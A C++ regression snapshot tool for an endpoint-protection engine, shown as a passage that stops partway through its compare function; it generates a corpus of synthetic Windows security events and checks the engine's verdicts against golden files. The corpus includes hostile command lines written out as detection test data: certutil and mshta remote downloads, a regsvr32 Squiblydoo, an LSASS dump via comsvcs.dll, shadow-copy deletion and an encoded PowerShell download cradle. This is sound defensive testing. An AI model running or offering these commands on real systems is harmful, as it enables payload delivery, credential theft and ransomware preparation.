/*++
    SnapshotTool.cpp
    裁决快照工具 —— 决策管线的回归基准。

    ============================ 它解决什么问题 ============================

    12 步决策管线的行为只存在于这份代码里,没有任何形式化描述。于是任何一处看起来无害的改动
    (调一个阈值、给某条规则换个通配符、往管线里插一步)都可能静默改掉【别的】事件的裁决 ——
    既不编译报错,也几乎不可能靠 review 发现。本工具把「当前行为」固化成一份可比对的基准。

    三种模式:
      --gen-corpus <corpus.json>            生成初始语料(覆盖 12 步管线的各条通路)
      --record    <corpus.json> <gold.json> 回放语料,记录黄金裁决
      --verify    <corpus.json> <gold.json> 回放语料,逐字段比对,不一致则非零退出

    另有一个不进 ctest 的辅助模式:
      --bench     <corpus.json> [rounds]    在同一份语料上量 evaluate() 的单条耗时

    --bench 不是回归门禁(耗时随机器而变,钉不住),它是【做性能改动时给出改前 / 改后可比
    数字】的工具。之所以放在这里而不是另建一个工程:它需要的正是 --verify 那一套可复现设置
    (钉死时钟 + 固定规则集 + 同一份语料),复用即可,不必再造一份。

    --verify 变红时的正确处置:先确认裁决变化是有意的、并说明为什么,然后 --record 重录黄金。
    不要为了让它变绿而反手改语料 —— 那等于把回归测试本身删掉。

    语料与黄金文件都是 JSON,且事件用的就是 SecurityEvent::toJson 的线格式(camelCase,
    与 IPC 协议同一份),所以语料可以直接拿真实 IPC 报文扩充,无需另造一套交换格式。

    ============================ 可复现性 ============================

    回放前钉死三件事,否则同一份语料在不同时刻 / 不同机器上会得到不同裁决:

      1. 「现在」—— bulwark::setFixedNowUtcForTest()。管线里有若干判定依赖墙上时钟
         (规则到期、证书剩余有效期、dropper 时间窗、基线学习期),见 bulwark/Clock.h。
      2. 规则集 —— DefaultRules::build() 加上语料自带的用户规则,顺序固定。
      3. QHash 迭代序 —— 由 CMake 给测试设 QT_HASH_SEED=0。规则排序本身已经是全序
         (RuleEngine 步骤 6 的比较器末级按 id 定序),这里再钉一次是为了让其它 QSet/QHash
         遍历(如 actorHashes)也稳定。

    另外:事件【按语料顺序在同一个 RuleEngine 实例上回放】。有状态时序监视器(勒索 / C2 信标 /
    外联速率 / 基线)的结论取决于事件序列 —— 逐条独立求值根本测不到它们。四个监视器都优先用
    e.timestampUtc,所以只要语料里的时间戳固定,时序结论就固定。
--*/

#include "bulwark/Clock.h"
#include "bulwark/engine/DefaultRules.h"
#include "bulwark/engine/RuleEngine.h"
#include "bulwark/engine/ThreatDetector.h"
#include "bulwark/models/DefenseRule.h"
#include "bulwark/models/RuntimeSettings.h"
#include "bulwark/models/SecurityEvent.h"
#include "bulwark/models/Verdict.h"
#include "bulwark/models/VtScanRecord.h"
/* Phase 7:IPC 线格式样本(--dump-ipc)。Payloads.h 已经把它用到的模型头都带进来了,
   这里额外显式包含那三个取证模型,避免依赖传递包含。 */
#include "bulwark/ipc/IpcMessage.h"
#include "bulwark/ipc/Payloads.h"
#include "bulwark/ipc/PipeNames.h"
#include "bulwark/models/AttackGraph.h"
#include "bulwark/models/JunkEntry.h"
#include "bulwark/models/PersistenceEntry.h"
#include "bulwark/models/ProcessEntry.h"

#include <QByteArray>
#include <QDateTime>
#include <QElapsedTimer>
#include <QFile>
#include <QHash>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QString>
#include <QStringList>
#include <QTextStream>
#include <QTimeZone>
#include <QVector>

#include <cstdio>
#include <limits>

using namespace bulwark;
using namespace bulwark::engine;

namespace {

// 语料 / 黄金文件的格式版本。改动字段含义时递增,使旧文件能被明确拒绝而不是静默误比。
constexpr int kSchema = 1;

// 钉死的「现在」。取一个固定的将来时刻,使语料里的证书有效期等相对时间保持稳定。
const char *kFixedNowIso = "2026-01-15T12:00:00.000Z";

QDateTime fixedNow()
{
    return QDateTime::fromString(QString::fromLatin1(kFixedNowIso), Qt::ISODateWithMs)
        .toTimeZone(QTimeZone::UTC);
}

QTextStream &out()
{
    static QTextStream s(stdout);
    return s;
}

QTextStream &err()
{
    static QTextStream s(stderr);
    return s;
}

// ------------------------------- 文件 I/O -------------------------------

bool readJson(const QString &path, QJsonObject *outObj)
{
    QFile f(path);
    if (!f.open(QIODevice::ReadOnly)) {
        err() << "无法打开: " << path << "\n";
        return false;
    }
    QJsonParseError pe{};
    const QJsonDocument doc = QJsonDocument::fromJson(f.readAll(), &pe);
    if (pe.error != QJsonParseError::NoError || !doc.isObject()) {
        err() << "JSON 解析失败: " << path << " -> " << pe.errorString() << "\n";
        return false;
    }
    *outObj = doc.object();
    return true;
}

bool writeJson(const QString &path, const QJsonObject &obj)
{
    QFile f(path);
    if (!f.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
        err() << "无法写入: " << path << "\n";
        return false;
    }
    // Indented:语料与黄金文件都要进版本库,可读的 diff 比紧凑格式重要得多。
    f.write(QJsonDocument(obj).toJson(QJsonDocument::Indented));
    return true;
}

// --------------------------- 事件构造小工具 ---------------------------
//
// 语料里的事件必须是【完全指定】的:id 与 timestampUtc 都显式给出,不依赖默认值
// (默认值走 QUuid::createUuid() / nowUtc(),前者随机、后者随钉死时钟变化)。

// 由标签派生一个稳定的 UUID —— 同一个标签永远得到同一个 id,故语料可重复生成且 diff 干净。
QUuid stableId(const QString &label)
{
    return QUuid::createUuidV5(QUuid{}, label.toUtf8());
}

struct EventSpec {
    QString   label;
    QString   note; // 这条语料意在打到管线的哪一步
    EventType type = EventType::ProcessCreate;
    int       pidOffset = 0; // 相对基准 PID 的偏移,使不同用例互不干扰
    QString   actorPath;
    QString   commandLine;
    QString   target;
    QString   detail;
    QString   parentPath;
    bool      signed_ = false;
    QString   publisher;
    QString   thumbprint;
    bool      certRevoked = false;
    bool      signedAfterExpiry = false;
    bool      signatureMismatch = false;
    bool      firstSeen = false;
    qint64    fileSize = 64 * 1024;
    QString   hash;
    int       secondsOffset = 0; // 相对钉死时刻的秒偏移,用于构造时序序列
    std::optional<int> certValidDays; // 证书剩余有效天数(相对钉死时刻)
};

SecurityEvent makeEvent(const EventSpec &s)
{
    SecurityEvent e;
    e.id = stableId(s.label);
    e.timestampUtc = fixedNow().addSecs(s.secondsOffset);
    e.type = s.type;
    e.actorPid = 4000 + s.pidOffset;
    e.actorPath = s.actorPath;
    e.actorHash = s.hash;
    e.actorSigned = s.signed_;
    e.signatureMismatch = s.signatureMismatch;
    e.actorFileSize = s.fileSize;
    e.actorPublisher = s.publisher;
    e.actorCertThumbprint = s.thumbprint;
    e.certRevoked = s.certRevoked;
    e.signedAfterCertExpiry = s.signedAfterExpiry;
    e.isFirstSeen = s.firstSeen;
    e.parentPid = 1000;
    e.parentPath = s.parentPath;
    e.commandLine = s.commandLine;
    e.target = s.target;
    e.detail = s.detail;
    if (s.certValidDays.has_value())
        e.certNotAfterUtc = fixedNow().addDays(*s.certValidDays);
    return e;
}

QJsonObject caseToJson(const EventSpec &s)
{
    QJsonObject o;
    o["label"] = s.label;
    o["note"] = s.note;
    o["event"] = makeEvent(s).toJson();
    return o;
}

} // namespace

// ============================== 语料生成 ==============================

namespace {

const char *kSelfDir = "C:\\Program Files\\Bulwark\\";
const char *kCanary  = "C:\\Users\\Public\\Documents\\__bulwark_canary__.docx";

// 微软签名 + System32 的强可信主体,复用于多条 LOLBin 用例:
// 这些用例的意义正是「签名可信但用法恶意」—— 签名信任必须被 LOLBin 滥用判定撤销。
EventSpec msSystem32(const QString &label, const QString &note, const QString &exe,
                     const QString &cmd, int pid)
{
    EventSpec s;
    s.label = label;
    s.note = note;
    s.type = EventType::ProcessCreate;
    s.pidOffset = pid;
    s.actorPath = QStringLiteral("C:\\Windows\\System32\\") + exe;
    s.commandLine = cmd;
    s.target = exe;
    s.parentPath = QStringLiteral("C:\\Windows\\explorer.exe");
    s.signed_ = true;
    s.publisher = QStringLiteral("Microsoft Corporation");
    s.hash = QStringLiteral("1111111111111111111111111111111111111111111111111111111111111111");
    return s;
}

QVector<EventSpec> buildCorpusCases()
{
    QVector<EventSpec> v;

    // ---- 步骤 1:无条件放行(自身组件 / 用户信任)----------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step1-self-component");
        s.note = QStringLiteral("步骤1:本软件自身组件,无条件放行(早于一切检测)");
        s.type = EventType::FileWrite;
        s.pidOffset = 1;
        s.actorPath = QString::fromLatin1(kSelfDir) + QStringLiteral("bulwark_service.exe");
        s.target = QStringLiteral("C:\\ProgramData\\Bulwark\\rules.json");
        v.push_back(s);
    }
    {
        // 语料自带一条 [信任] 规则指向它(见 buildCorpusRules)。
        EventSpec s;
        s.label = QStringLiteral("step1-user-trusted-file");
        s.note = QStringLiteral("步骤1:用户明确信任的文件,跳过后续全部检测");
        s.type = EventType::ProcessCreate;
        s.pidOffset = 2;
        s.actorPath = QStringLiteral("C:\\Tools\\trusted_tool.exe");
        s.commandLine = QStringLiteral("\"C:\\Tools\\trusted_tool.exe\" -enc AAAA");
        s.target = QStringLiteral("trusted_tool.exe");
        v.push_back(s);
    }

    // ---- 步骤 2:已安装安全软件共存放行 ------------------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step2-security-product-coexist");
        s.note = QStringLiteral("步骤2:火绒 HipsDaemon 位于 Program Files,共存放行");
        s.type = EventType::RegistryWrite;
        s.pidOffset = 3;
        s.actorPath = QStringLiteral("C:\\Program Files\\Huorong\\Sysdiag\\bin\\HipsDaemon.exe");
        s.target = QStringLiteral("HKLM\\SYSTEM\\CurrentControlSet\\Services\\Sysdiag\\Start");
        s.signed_ = true;
        s.publisher = QStringLiteral("Beijing Huorong Network Technology Co., Ltd.");
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step2-security-name-outside-installdir");
        s.note = QStringLiteral("步骤2 反例:安全软件同名程序但落在 Temp,不得共存放行");
        s.type = EventType::RegistryWrite;
        s.pidOffset = 4;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\HipsDaemon.exe");
        s.target = QStringLiteral("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\x");
        v.push_back(s);
    }

    // ---- 步骤 3:良性厂商应用,仅网络/DNS 维度 -----------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step3-vendor-app-network");
        s.note = QStringLiteral("步骤3:微信健康签名 + 网络外联,放行(压制心跳被判 C2)");
        s.type = EventType::NetworkConnect;
        s.pidOffset = 5;
        s.actorPath = QStringLiteral("C:\\Program Files\\Tencent\\WeChat\\WeChat.exe");
        s.target = QStringLiteral("203.205.239.1");
        s.detail = QStringLiteral("443");
        s.signed_ = true;
        s.publisher = QStringLiteral("Tencent Technology (Shenzhen) Company Limited");
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step3-vendor-app-imageload-NOT-exempt");
        s.note = QStringLiteral("步骤3 边界:同一厂商应用的模块加载【不】走该豁免,侧载须照常检测");
        s.type = EventType::ImageLoad;
        s.pidOffset = 5;
        s.actorPath = QStringLiteral("C:\\Program Files\\Tencent\\WeChat\\WeChat.exe");
        s.target = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\evil_hook.dll");
        s.signed_ = true;
        s.publisher = QStringLiteral("Tencent Technology (Shenzhen) Company Limited");
        v.push_back(s);
    }

    // ---- 步骤 4:LOLBin 滥用(签名可信但用法恶意,须撤销签名信任)-----------
    v.push_back(msSystem32(
        QStringLiteral("step4-lolbin-certutil-urlcache"),
        QStringLiteral("步骤4:certutil 远程下载(T1105),硬指标"),
        QStringLiteral("certutil.exe"),
        QStringLiteral("certutil.exe -urlcache -split -f http://198.51.100.7/p.exe %TEMP%\\p.exe"),
        10));
    v.push_back(msSystem32(
        QStringLiteral("step4-lolbin-regsvr32-squiblydoo"),
        QStringLiteral("步骤4:regsvr32 Squiblydoo 远程脚本执行(T1218.010)"),
        QStringLiteral("regsvr32.exe"),
        QStringLiteral("regsvr32.exe /s /n /u /i:http://198.51.100.7/a.sct scrobj.dll"),
        11));
    v.push_back(msSystem32(
        QStringLiteral("step4-lolbin-mshta-remote"),
        QStringLiteral("步骤4:mshta 远程 HTA(T1218.005)"),
        QStringLiteral("mshta.exe"),
        QStringLiteral("mshta.exe http://198.51.100.7/x.hta"),
        12));
    v.push_back(msSystem32(
        QStringLiteral("step4-lolbin-comsvcs-lsass-dump"),
        QStringLiteral("步骤4:rundll32 comsvcs.dll MiniDump 转储 LSASS(T1003.001)"),
        QStringLiteral("rundll32.exe"),
        QStringLiteral("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\l.dmp full"),
        13));
    v.push_back(msSystem32(
        QStringLiteral("step4-lolbin-vssadmin-delete-shadows"),
        QStringLiteral("步骤4:删除卷影(T1490)—— 勒索前置动作,一瞬间完成故必须硬拦"),
        QStringLiteral("vssadmin.exe"),
        QStringLiteral("vssadmin.exe delete shadows /all /quiet"),
        14));
    v.push_back(msSystem32(
        QStringLiteral("step4-powershell-encoded-download"),
        QStringLiteral("步骤4:powershell -enc + 内存下载执行(T1059.001 + T1105)"),
        QStringLiteral("WindowsPowerShell\\v1.0\\powershell.exe"),
        QStringLiteral("powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0"
                       "ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAA=="),
        15));

    // ---- 步骤 4:身份伪装类硬指标 -----------------------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step4-masquerade-svchost-outside-system32");
        s.note = QStringLiteral("步骤4:系统进程名出现在非法目录(T1036.005)");
        s.pidOffset = 20;
        s.actorPath = QStringLiteral("C:\\Users\\Public\\svchost.exe");
        s.target = QStringLiteral("svchost.exe");
        s.parentPath = QStringLiteral("C:\\Windows\\explorer.exe");
        s.firstSeen = true;
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step4-typosquat-svch0st");
        s.note = QStringLiteral("步骤4:形近字冒充系统进程(编辑距离<=1)");
        s.pidOffset = 21;
        s.actorPath = QStringLiteral("C:\\Windows\\System32\\svch0st.exe");
        s.target = QStringLiteral("svch0st.exe");
        s.firstSeen = true;
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step4-double-extension");
        s.note = QStringLiteral("步骤4:双扩展名伪装(T1036.007)");
        s.pidOffset = 22;
        s.actorPath = QStringLiteral("C:\\Users\\u\\Downloads\\invoice.pdf.exe");
        s.target = QStringLiteral("invoice.pdf.exe");
        s.parentPath = QStringLiteral("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
        s.firstSeen = true;
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step4-office-spawns-lolbin");
        s.note = QStringLiteral("步骤4:Office 派生脚本宿主(宏病毒/钓鱼典型链)");
        s.pidOffset = 23;
        s.actorPath = QStringLiteral("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
        s.commandLine = QStringLiteral("powershell.exe -ExecutionPolicy Bypass -w hidden -File C:\\Users\\u\\a.ps1");
        s.target = QStringLiteral("powershell.exe");
        s.parentPath = QStringLiteral("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE");
        s.signed_ = true;
        s.publisher = QStringLiteral("Microsoft Corporation");
        v.push_back(s);
    }

    // ---- 步骤 4:注入 / 凭据访问 ------------------------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step4-remote-thread-into-lsass");
        s.note = QStringLiteral("步骤4:向 lsass 建远程线程(凭据访问 + 注入双硬指标)");
        s.type = EventType::RemoteThread;
        s.pidOffset = 24;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\dump.exe");
        s.target = QStringLiteral("C:\\Windows\\System32\\lsass.exe");
        s.firstSeen = true;
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step4-sideload-unsigned-dll-from-temp");
        s.note = QStringLiteral("步骤4:签名宿主从可写目录加载未签名模块(白加黑侧载)");
        s.type = EventType::ImageLoad;
        s.pidOffset = 25;
        s.actorPath = QStringLiteral("C:\\Program Files\\SomeVendor\\host.exe");
        s.target = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\version.dll");
        s.signed_ = true;
        s.publisher = QStringLiteral("SomeVendor Ltd");
        v.push_back(s);
    }

    // ---- 步骤 5:有状态时序 —— 勒索蜜罐诱饵 -------------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step5-ransomware-canary-touch");
        s.note = QStringLiteral("步骤5:改写勒索诱饵文件 —— 强勒索信号,直接 Block");
        s.type = EventType::FileWrite;
        s.pidOffset = 30;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\locker.exe");
        s.target = QString::fromLatin1(kCanary);
        s.firstSeen = true;
        v.push_back(s);
    }

    // ---- 步骤 5:有状态时序 —— C2 信标(周期性外联,需要一串事件)---------
    // 同一 PID + 同一远端,固定 60 秒间隔、抖动极小 —— 正是信标检测要抓的形态。
    // 单条事件无法触发,必须成序列,故这里连发 10 条。
    for (int i = 0; i < 10; ++i) {
        EventSpec s;
        s.label = QStringLiteral("step5-beacon-%1").arg(i, 2, 10, QLatin1Char('0'));
        s.note = QStringLiteral("步骤5:周期性外联第 %1 拍(60s 间隔,低抖动)").arg(i + 1);
        s.type = EventType::NetworkConnect;
        s.pidOffset = 31;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Roaming\\updater.exe");
        s.target = QStringLiteral("198.51.100.42");
        s.detail = QStringLiteral("8443");
        s.secondsOffset = 600 + i * 60;
        s.firstSeen = (i == 0);
        v.push_back(s);
    }

    // ---- 步骤 5:DGA 域名 -------------------------------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step5-dga-dns-query");
        s.note = QStringLiteral("步骤5:高熵无元音域名(纯字符串统计,不依赖黑名单)");
        s.type = EventType::DnsQuery;
        s.pidOffset = 32;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Roaming\\updater.exe");
        s.target = QStringLiteral("xkqvbzrmthnwpldj.top");
        s.secondsOffset = 1300;
        v.push_back(s);
    }

    // ---- 步骤 6:显式规则 -------------------------------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step6-explicit-block-rule");
        s.note = QStringLiteral("步骤6:命中语料自带的用户 Block 规则");
        s.pidOffset = 40;
        s.actorPath = QStringLiteral("C:\\Tools\\blocked_tool.exe");
        s.target = QStringLiteral("blocked_tool.exe");
        s.signed_ = true;
        s.publisher = QStringLiteral("Some Publisher");
        v.push_back(s);
    }

    // ---- 步骤 7:强可信主体 ----------------------------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step7-strongly-trusted-ms-system32");
        s.note = QStringLiteral("步骤7:微软签名 + 系统目录 + 无危险行为 -> 跳过行为检测");
        s.type = EventType::FileWrite;
        s.pidOffset = 41;
        s.actorPath = QStringLiteral("C:\\Windows\\System32\\notepad.exe");
        s.target = QStringLiteral("C:\\Users\\u\\Documents\\note.txt");
        s.signed_ = true;
        s.publisher = QStringLiteral("Microsoft Corporation");
        v.push_back(s);
    }

    // ---- 步骤 8:证书异常 -> Block ---------------------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step8-cert-revoked");
        s.note = QStringLiteral("步骤8:证书已被吊销 -> Block");
        s.pidOffset = 42;
        s.actorPath = QStringLiteral("C:\\Program Files\\Vendor\\app.exe");
        s.target = QStringLiteral("app.exe");
        s.signed_ = true;
        s.publisher = QStringLiteral("Revoked Vendor");
        s.certRevoked = true;
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step8-signed-after-cert-expiry");
        s.note = QStringLiteral("步骤8:证书过期之后才签名(时间戳伪造迹象)-> Block");
        s.pidOffset = 43;
        s.actorPath = QStringLiteral("C:\\Program Files\\Vendor\\app2.exe");
        s.target = QStringLiteral("app2.exe");
        s.signed_ = true;
        s.publisher = QStringLiteral("Expired Vendor");
        s.signedAfterExpiry = true;
        v.push_back(s);
    }

    // ---- 步骤 9:健康签名放行 / 及其边界 ---------------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step9-healthy-signed-allow");
        s.note = QStringLiteral("步骤9:合法厂商签名且健康 -> 放行");
        s.type = EventType::FileWrite;
        s.pidOffset = 44;
        s.actorPath = QStringLiteral("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
        s.target = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Google\\Chrome\\User Data\\x.tmp");
        s.signed_ = true;
        s.publisher = QStringLiteral("Google LLC");
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step9-firstseen-shortlived-cert");
        s.note = QStringLiteral("步骤9 边界:首见 + 证书剩余不足186天(空壳公司新证书)-> 不走健康签名放行");
        s.pidOffset = 45;
        s.actorPath = QStringLiteral("C:\\Users\\u\\Downloads\\newapp.exe");
        s.target = QStringLiteral("newapp.exe");
        s.signed_ = true;
        s.publisher = QStringLiteral("Brand New LLC");
        s.firstSeen = true;
        s.certValidDays = 90; // 相对钉死时刻仅剩 90 天
        v.push_back(s);
    }

    // ---- 步骤 10 / 11:硬指标门限与默认放行 ------------------------------
    {
        EventSpec s;
        s.label = QStringLiteral("step11-unsigned-benign-allow");
        s.note = QStringLiteral("步骤11:未签名但无任何硬指标 -> 一律放行(软信号绝不单独定罪)");
        s.type = EventType::FileWrite;
        s.pidOffset = 46;
        s.actorPath = QStringLiteral("C:\\Users\\u\\Documents\\myscript_output.exe");
        s.target = QStringLiteral("C:\\Users\\u\\Documents\\out.txt");
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step11-unsigned-from-temp-softsignals-only");
        s.note = QStringLiteral("步骤11:未签名 + Temp 目录 + 首见 —— 全是软信号,仍应放行而非拦截");
        s.type = EventType::FileWrite;
        s.pidOffset = 47;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\installer_helper.exe");
        s.target = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\payload.dat");
        s.firstSeen = true;
        v.push_back(s);
    }

    return v;
}

// 语料自带的用户规则(叠加在 DefaultRules 之上)。
QVector<DefenseRule> buildCorpusRules()
{
    QVector<DefenseRule> v;
    {
        DefenseRule r = DefenseRule::createTrust(QStringLiteral("C:\\Tools\\trusted_tool.exe"),
                                                 QStringLiteral("语料:用户信任项"));
        r.id = stableId(QStringLiteral("rule-trust-tool"));
        r.createdUtc = fixedNow().addDays(-30);
        v.push_back(r);
    }
    {
        DefenseRule r;
        r.id = stableId(QStringLiteral("rule-block-tool"));
        r.actorPath = QStringLiteral("C:\\Tools\\blocked_tool.exe");
        r.action = VerdictAction::Block;
        r.note = QStringLiteral("语料:用户 Block 规则");
        r.createdUtc = fixedNow().addDays(-10);
        v.push_back(r);
    }
    return v;
}

QJsonObject buildCorpus()
{
    QJsonObject root;
    root["schema"] = kSchema;
    root["fixedNowUtc"] = QString::fromLatin1(kFixedNowIso);

    QJsonArray selfDirs;
    selfDirs.append(QString::fromLatin1(kSelfDir));
    root["selfDirectories"] = selfDirs;

    QJsonArray canaries;
    canaries.append(QString::fromLatin1(kCanary));
    root["canaryFiles"] = canaries;

    QJsonObject engine;
    engine["enableBaseline"] = true;
    engine["trustSignedActors"] = true;
    root["engine"] = engine;

    QJsonArray rules;
    for (const DefenseRule &r : buildCorpusRules())
        rules.append(r.toJson());
    root["rules"] = rules;

    QJsonArray cases;
    for (const EventSpec &s : buildCorpusCases())
        cases.append(caseToJson(s));
    root["cases"] = cases;

    return root;
}

// ============================== 回放 ==============================

struct CaseResult {
    QString     label;
    QJsonObject snapshot;
};

// 把一条裁决 + 事件的判定相关状态压成可比对的快照。
//
// 刻意【不含】证据的时间戳:钉死时钟下它们全等于同一个值,记进去只是噪音。
// 但保留 source / kind / description / scoreDelta —— 证据链是裁决的解释,
// 只比最终 action 会漏掉「结论对了但理由变了」这类回归。
QJsonObject snapshotOf(const SecurityEvent &e, const Verdict &v)
{
    QJsonObject o;
    o["action"] = verdictActionToString(v.action);
    o["source"] = verdictSourceToString(v.source);
    o["riskScore"] = e.riskScore;
    o["hasThreatIndicator"] = e.hasThreatIndicator;
    o["matchedRuleNote"] = e.matchedRuleNote;
    o["userTrusted"] = e.userTrusted;
    o["memoryInjection"] = e.memoryInjection;

    QJsonArray tech;
    for (const QString &t : e.techniques)
        tech.append(t);
    o["techniques"] = tech;

    QJsonArray reasons;
    for (const QString &r : e.riskReasons)
        reasons.append(r);
    o["riskReasons"] = reasons;

    QJsonArray ev;
    for (const Evidence &x : e.evidenceChain) {
        QJsonObject j;
        j["source"] = x.source;
        j["kind"] = evidenceKindToString(x.kind);
        j["description"] = x.description;
        j["scoreDelta"] = x.scoreDelta;
        ev.append(j);
    }
    o["evidence"] = ev;
    return o;
}

bool replay(const QJsonObject &corpus, QVector<CaseResult> *results, QString *fixedNowOut)
{
    if (corpus.value(QLatin1String("schema")).toInt() != kSchema) {
        err() << "语料 schema 版本不匹配(期望 " << kSchema << ")\n";
        return false;
    }
    const QString nowIso = corpus.value(QLatin1String("fixedNowUtc")).toString();
    const QDateTime pinned = QDateTime::fromString(nowIso, Qt::ISODateWithMs).toTimeZone(QTimeZone::UTC);
    if (!pinned.isValid()) {
        err() << "语料缺少有效的 fixedNowUtc\n";
        return false;
    }
    *fixedNowOut = nowIso;

    // (1) 钉死「现在」—— 必须在构造引擎与事件之前,因为默认成员初始化会读它。
    setFixedNowUtcForTest(pinned);

    RuleEngine engine;
    const QJsonObject eng = corpus.value(QLatin1String("engine")).toObject();
    engine.enableBaseline = eng.value(QLatin1String("enableBaseline")).toBool(true);
    engine.trustSignedActors = eng.value(QLatin1String("trustSignedActors")).toBool(true);

    for (const QJsonValue &v : corpus.value(QLatin1String("selfDirectories")).toArray())
        engine.addSelfDirectory(v.toString());
    for (const QJsonValue &v : corpus.value(QLatin1String("canaryFiles")).toArray())
        engine.addCanaryFile(v.toString());

    // (2) 固定规则集:内置规则 + 语料自带用户规则。
    QVector<DefenseRule> rules = DefaultRules::build();
    for (const QJsonValue &v : corpus.value(QLatin1String("rules")).toArray())
        rules.push_back(DefenseRule::fromJson(v.toObject()));
    engine.loadRules(rules);

    // (3) 按语料顺序在【同一个】引擎实例上回放 —— 时序监视器依赖事件序列。
    const QJsonArray cases = corpus.value(QLatin1String("cases")).toArray();
    results->reserve(cases.size());
    for (const QJsonValue &cv : cases) {
        const QJsonObject c = cv.toObject();
        SecurityEvent e = SecurityEvent::fromJson(c.value(QLatin1String("event")).toObject());
        const Verdict verdict = engine.evaluate(e);
        CaseResult r;
        r.label = c.value(QLatin1String("label")).toString();
        r.snapshot = snapshotOf(e, verdict);
        results->push_back(r);
    }

    setFixedNowUtcForTest(QDateTime()); // 恢复真实时钟,避免影响同进程后续代码
    return true;
}

// ============================== 比对 ==============================

void diffArrays(const QString &field, const QJsonArray &want, const QJsonArray &got,
                QStringList *msgs)
{
    if (want == got)
        return;
    msgs->append(QStringLiteral("      %1: 期望 %2 项,实际 %3 项")
                     .arg(field)
                     .arg(want.size())
                     .arg(got.size()));
    const int n = qMax(want.size(), got.size());
    for (int i = 0; i < n; ++i) {
        const QJsonValue a = i < want.size() ? want.at(i) : QJsonValue();
        const QJsonValue b = i < got.size() ? got.at(i) : QJsonValue();
        if (a == b)
            continue;
        const auto render = [](const QJsonValue &v) -> QString {
            if (v.isUndefined() || v.isNull())
                return QStringLiteral("<缺失>");
            if (v.isString())
                return v.toString();
            return QString::fromUtf8(QJsonDocument(v.toObject()).toJson(QJsonDocument::Compact));
        };
        msgs->append(QStringLiteral("        [%1] 期望: %2").arg(i).arg(render(a)));
        msgs->append(QStringLiteral("        [%1] 实际: %2").arg(i).arg(render(b)));
    }
}

int compare(const QJsonObject &golden, const QVector<CaseResult> &results)
{
    if (golden.value(QLatin1String("schema")).toInt() != kSchema) {
        err() << "黄金文件 schema 版本不匹配(期望 " << kSchema << ")\n";
        return 1;
    }
    const QJsonArray want = golden.value(QLatin1String("results")).toArray();
    int failed = 0;

    if (want.size() != results.size()) {
        out() << "用例数不一致:黄金 " << want.size() << " 条,本次回放 " << results.size() << " 条\n";
        ++failed;
    }

    const int n = qMin(want.size(), results.size());
    for (int i = 0; i < n; ++i) {
        const QJsonObject w = want.at(i).toObject();
        const QString wLabel = w.value(QLatin1String("label")).toString();
        const QString gLabel = results[i].label;
        if (wLabel != gLabel) {
            out() << "[" << i << "] 标签不一致:黄金 " << wLabel << ",本次 " << gLabel << "\n";
            ++failed;
            continue;
        }
        const QJsonObject wSnap = w.value(QLatin1String("snapshot")).toObject();
        const QJsonObject gSnap = results[i].snapshot;
        if (wSnap == gSnap)
            continue;

        ++failed;
        out() << "MISMATCH  " << gLabel << "\n";
        QStringList msgs;
        for (const QString &key : { QStringLiteral("action"), QStringLiteral("source"),
                                    QStringLiteral("riskScore"), QStringLiteral("hasThreatIndicator"),
                                    QStringLiteral("matchedRuleNote"), QStringLiteral("userTrusted"),
                                    QStringLiteral("memoryInjection") }) {
            const QJsonValue a = wSnap.value(key);
            const QJsonValue b = gSnap.value(key);
            if (a != b) {
                msgs.append(QStringLiteral("      %1: 期望 %2,实际 %3")
                                .arg(key,
                                     a.toVariant().toString(),
                                     b.toVariant().toString()));
            }
        }
        diffArrays(QStringLiteral("techniques"), wSnap.value(QLatin1String("techniques")).toArray(),
                   gSnap.value(QLatin1String("techniques")).toArray(), &msgs);
        diffArrays(QStringLiteral("riskReasons"), wSnap.value(QLatin1String("riskReasons")).toArray(),
                   gSnap.value(QLatin1String("riskReasons")).toArray(), &msgs);
        diffArrays(QStringLiteral("evidence"), wSnap.value(QLatin1String("evidence")).toArray(),
                   gSnap.value(QLatin1String("evidence")).toArray(), &msgs);
